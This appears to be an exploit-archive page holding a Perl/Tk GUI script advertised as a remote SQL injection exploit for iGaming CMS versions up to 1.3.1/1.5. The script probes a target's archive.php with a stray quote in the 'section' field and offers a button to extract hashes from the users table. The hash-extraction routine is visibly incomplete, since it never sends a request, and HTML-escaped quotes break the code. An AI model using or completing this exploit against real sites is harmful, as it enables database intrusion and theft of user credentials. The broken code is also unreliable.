iGaming CMS <= 1.3.1/1.5 Remote SQL Injection Exploit
=====================================================



#!/usr/bin/perl

	use Tk;
	use Tk::BrowseEntry;
	use Tk::DialogBox;
	use LWP::UserAgent;

	$mw = new MainWindow(title => "UnderWHAT?!" );

	$mw->geometry ( &#039;395x180&#039; ) ;
	$mw->resizable(0,0);

	$mw->Label(-text => &#039;&#039;, -font => &#039;{Verdana} 2&#039;,-foreground=>&#039;red&#039;)->pack();
	$mw->Label(-text => &#039;iGaming cms <= 1.3.1 Remote Sql Injection&#039;, -font => &#039;{Tahoma} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$mw->Label(-text => &#039;found by gemaglabin [ mafia of antichat ]&#039;, -font => &#039;{Tahoma} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
	$mw->Label(-text => &#039;&#039;, -font => &#039;{Tahoma} 2 bold&#039;,-foreground=>&#039;red&#039;)->pack();


	$fleft  = $mw->Frame()->pack ( -side => &#039;left&#039;, -anchor => &#039;ne&#039;) ;
	$fright = $mw->Frame()->pack ( -side => &#039;left&#039;, -anchor => &#039;nw&#039;) ;

	$url      = &#039;http://test2.ru/igaming/&#039;;
	$user_id  = &#039;1&#039;;
	$table    = &#039;users&#039;;
	$report   = &#039;&#039;;
	


	$fleft->Label ( -text => &#039;Path to site index: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$url) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

	$fleft->Label ( -text => &#039;User ID: &#039;, -font => &#039;{Verdana} 8 bold&#039; ) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$user_id) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

	$fleft->Label ( -text => &#039;Returned data: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$hash) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

	$fright->Label( -text => &#039; &#039;)->pack();
	$fleft->Label( -text => &#039; &#039;)->pack();
	
	$fleft->Label ( -text => "Test site vulnerability", -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
	$fright->Button(-text    => "Test site vulnerability",
	                -relief => "groove",
	                -width => &#039;30&#039;,
	                -font => &#039;{Verdana} 8 bold&#039;,
	                -activeforeground => &#039;red&#039;,
	                -command => \&test_vuln
	               )->pack();
				   
				   
	$fleft->Label ( -text => "Get all possible data ", -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
	$fright->Button(-text    => &#039;Get data from database&#039;,
	                -relief => "groove",
	                -width => &#039;30&#039;,
	                -font => &#039;{Verdana} 8 bold&#039;,
	                -activeforeground => &#039;red&#039;,
	                -command => \&get_hash
	               )->pack();
				  
	
	MainLoop();
	
	sub get_hash()
	{
		$xpl = LWP::UserAgent->new( ) or die;
		$InfoWindow=$mw->DialogBox(-title   => &#039;get hash from database&#039;, -buttons => ["OK"]);
		if($res->as_string =~ /Date Posted: (.*)</)
		{
			$hash = $1;
		}
	}

	 
	sub test_vuln()
	{
		$InfoWindow=$mw->DialogBox(-title   => &#039;test site vulnerability&#039;, -buttons => ["OK"]);
		$InfoWindow->add(&#039;Label&#039;, -text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
		$InfoWindow->add(&#039;Label&#039;, -text => $url, -font => &#039;{Verdana} 8&#039;)->pack;
		$InfoWindow->add(&#039;Label&#039;, -text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
		$xpl = LWP::UserAgent->new( ) or die;
		$res = $xpl->post($url."archive.php",[&#039;section&#039;=>"&#039;"]);
		if($res->as_string =~ /Fatal error/i ) { $hash=&#039;SITE VULNERABLE&#039;}
		else { $hash = &#039;SITE UNVULNERABLE&#039;} 
	}



